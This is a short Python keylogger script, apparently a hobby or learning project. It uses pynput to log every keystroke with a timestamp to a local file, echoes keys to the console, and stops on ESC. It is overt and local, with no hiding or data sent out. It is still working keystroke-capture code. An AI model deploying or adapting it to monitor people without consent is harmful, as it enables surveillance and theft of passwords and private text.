from pynput import keyboard
from datetime import datetime
import os

# Set custom save path
log_directory = r"C:\Users\ranek\OneDrive\Desktop\Hello World\key_logger"
log_file = os.path.join(log_directory, "keylog.txt")

# Create directory if it doesn't exist
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Format special keys to readable form
def format_key(key):
    key_str = str(key).replace("'", "")

    replacements = {
        "Key.space": " [SPACE] ",
        "Key.enter": "\n[ENTER] ",
        "Key.tab": " [TAB] ",
        "Key.backspace": " [BACKSPACE] ",
        "Key.shift": " [SHIFT] ",
        "Key.shift_r": " [SHIFT] ",
        "Key.ctrl_l": " [CTRL] ",
        "Key.ctrl_r": " [CTRL] ",
        "Key.alt_l": " [ALT] ",
        "Key.alt_r": " [ALT] ",
        "Key.esc": " [ESC] ",
        "Key.caps_lock": " [CAPSLOCK] ",
    }

    return replacements.get(key_str, key_str)

# Save formatted key with timestamp
def write_to_file(key):
    time_stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"{time_stamp} - {key}\n")

# Triggered on key press
def on_press(key):
    formatted = format_key(key)
    print(f"[KEY PRESSED] {formatted}")  # Display in console
    write_to_file(formatted)

# Stop listener on ESC
def on_release(key):
    if key == keyboard.Key.esc:
        print("🔴 ESC pressed — stopping keylogger.")
        return False

# Start keylogger
print("🟢 Keylogger started. Press ESC to stop.\n")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
